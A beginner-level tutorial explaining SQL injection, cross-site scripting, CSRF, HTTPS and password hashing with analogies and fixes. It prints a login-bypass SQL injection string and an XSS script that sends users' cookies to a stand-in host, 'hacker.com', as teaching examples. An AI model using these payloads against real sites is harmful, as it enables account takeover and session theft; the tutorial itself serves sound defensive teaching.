# Web Security: General Principles

## What is Security?

Think of your website as a **House**. 
- **The Users** are guests you want to invite in.
- **The Hackers** are burglars trying to break in.

Security isn't about one "Magic Lock" — it's about having strong walls, a good roof, locks on every window, and a security camera.

---

## The Golden Rule: NEVER TRUST USER INPUT

This is the most important rule in all of programming. 

Anything a user types into a box (username, password, search query) could be a **Trojan Horse** — a gift that hides a trap.

---

## 1. SQL Injection (The Fake Name Attack)

Imagine a login form that asks for your name. The backend code looks like this:

```python
# ❌ DANGEROUS CODE
name = request.form['name']
query = f"SELECT * FROM users WHERE name = '{name}'"
```

A normal user types `Alice`. The query becomes `... WHERE name = 'Alice'`.
A hacker types: `' OR 1=1; --`

The query becomes:
`SELECT * FROM users WHERE name = '' OR 1=1; --'`

**What happened?**
1. `1=1` is ALWAYS true.
2. `--` tells the database to ignore the rest of the line.
3. The database returns EVERY user in the system! The hacker is logged in without a password.

**The Fix: Parameterized Queries**
```python
# ✅ SAFE CODE
db.execute("SELECT * FROM users WHERE name = ?", (name,))
# The '?' tells the database: "Treat this input as plain text ONLY, never as code."
```

---

## 2. XSS: Cross-Site Scripting (The Poisoned Comment)

Imagine a blog where users can leave comments.

**The Attack:**
A hacker leaves a comment that contains a `<script>` tag:
`<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>`

**The Result:**
Every innocent person who visits the blog now has their browser **automatically send their secret login cookie** to the hacker!

**The Fix: Escaping**
Modern tools (like Jinja2 in Flask) automatically "escape" text. They turn `<` into `&lt;`. 
The browser then displays the code as text instead of running it.

---

## 3. CSRF: Cross-Site Request Forgery (The Forged Signature)

Imagine you are logged into your bank. You visit a hacker's website in another tab. 

**The Attack:**
The hacker's site has a hidden form that automatically submits to `bank.com/transfer?to=hacker&amount=1000`.
Because you are logged in, your browser sends your bank cookie with the request. The bank thinks YOU sent the money!

**The Fix: CSRF Tokens**
The bank gives you a "One-Time Secret Token" for every form. If the form doesn't have that exact secret token, the bank rejects it. Since the hacker doesn't know your secret token, they can't forge the request.

---

## 4. HTTPS: The Secret Tunnel

When you visit a `http://` site, your data (including passwords) travels across the internet as **plain text**. Anyone between you and the server can "eavesdrop" and read it.

**HTTPS** (The 'S' stands for Secure) creates an **encrypted tunnel**. 

```
  HTTP:   Alice → "My Password is 123" → Internet → Server
          (Anyone can see: "My Password is 123")

  HTTPS:  Alice → "AxB7%*!9" → Internet → Server
          (Eavesdroppers only see gibberish. Only the server can decode it.)
```

---

## 5. Password Hashing (The One-Way Mirror)

**Never store passwords in plain text!** If a hacker steals your database, they have everyone's passwords.

Instead, we use a **Hash Function**. It's a "one-way" math formula:
`Password` → `Hash Function` → `Gibberish`

- It's easy to turn `12345` into `AxB7%`.
- It's **impossible** to turn `AxB7%` back into `12345`.

When you log in, the server hashes your password and compares the result to the hash in the database.

---

## Glossary

| Term | Meaning |
|:---|:---|
| **SQL Injection** | Tricking a database into running malicious commands |
| **XSS** | Injecting malicious scripts into a website for other users |
| **CSRF** | Tricking a user's browser into making an unwanted request |
| **HTTPS** | Encrypted communication between browser and server |
| **Hashing** | Scrambling a password so it can't be read back |
| **Salting** | Adding random characters to a password before hashing for extra safety |
| **Escaping** | Turning special characters into plain text (e.g., `<` to `&lt;`) |
